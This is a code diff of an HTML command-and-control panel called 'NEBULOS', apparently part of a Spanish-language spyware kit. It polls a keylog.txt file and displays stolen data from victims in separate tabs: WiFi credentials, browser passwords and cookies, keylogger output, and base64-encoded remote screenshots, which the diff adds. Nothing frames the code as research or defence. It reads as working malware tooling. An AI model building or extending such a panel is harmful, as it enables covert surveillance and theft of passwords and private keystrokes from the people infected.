@@ -3,42 +3,48 @@
 <head>
     <title>NEBULOS | C2 CONTROL</title>
     <style>
-        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
-        .box { border: 2px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #003b00; }
-        .nav { margin-bottom: 20px; border-bottom: 1px solid #00ff41; padding-bottom: 10px; }
-        button { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; cursor: pointer; }
-        button:hover, .active { background: #00ff41; color: #000; font-weight: bold; }
-        pre { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #003b00; padding: 10px; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .box { border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 15px #030; }
+        .nav { margin-bottom: 20px; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; cursor: pointer; }
+        button:hover, .act { background: #0f0; color: #000; font-weight: bold; }
+        #log { white-space: pre-wrap; height: 500px; overflow: auto; border: 1px inset #030; padding: 10px; }
+        #img-view { display: none; width: 100%; border: 1px solid #0f0; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>[ NEBULOS SYSTEM ACTIVATED ]</h2>
+        <h2>[ NEBULOS SYSTEM ]</h2>
         <div class="nav">
-            <button onclick="view('sys')">SISTEMA</button>
-            <button onclick="view('wifi')">WIFI</button>
-            <button onclick="view('nav')">NAVEGADOR/COOKIES</button>
-            <button onclick="view('key')">KEYLOGGER</button>
-            <button onclick="view('all')">VER TODO</button>
+            <button onclick="v('w')">WIFI</button>
+            <button onclick="v('n')">PASSWORDS</button>
+            <button onclick="v('k')">KEYLOG</button>
+            <button onclick="v('s')">VISTA REMOTA</button>
         </div>
-        <pre id="console">Estableciendo enlace...</pre>
+        <pre id="log">Estableciendo enlace...</pre>
+        <img id="img-view">
     </div>
 
     <script>
         let raw = "";
-        async function update() {
+        async function up() {
             const r = await fetch('keylog.txt?t=' + Math.random());
-            if(r.ok) { raw = await r.text(); view('all'); }
+            if(r.ok) { raw = await r.text(); v('n'); }
         }
-        function view(mode) {
-            const c = document.getElementById('console');
-            if(mode==='sys') c.textContent = raw.split('--- SISTEMA ---')[1]?.split('--- WIFI ---')[0];
-            else if(mode==='wifi') c.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
-            else if(mode==='nav') c.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYLOGGER ---')[0];
-            else if(mode==='key') c.textContent = raw.split('--- KEYLOGGER ---')[1];
-            else c.textContent = raw;
+        function v(m) {
+            const l = document.getElementById('log');
+            const i = document.getElementById('img-view');
+            i.style.display = "none"; l.style.display = "block";
+            
+            if(m==='w') l.textContent = raw.split('--- WIFI ---')[1]?.split('--- NAVEGADOR ---')[0];
+            else if(m==='n') l.textContent = raw.split('--- NAVEGADOR ---')[1]?.split('--- KEYLOGGER ---')[0];
+            else if(m==='k') l.textContent = raw.split('--- KEYLOGGER ---')[1]?.split('--- SCREENSHOT ---')[0];
+            else if(m==='s') {
+                const b = raw.split('--- SCREENSHOT ---')[1]?.trim();
+                if(b) { i.src = "data:image/png;base64," + b; i.style.display = "block"; l.style.display = "none"; }
+            }
         }
-        setInterval(update, 20000); update();
+        setInterval(up, 20000); up();
     </script>
 </body>
 </html>
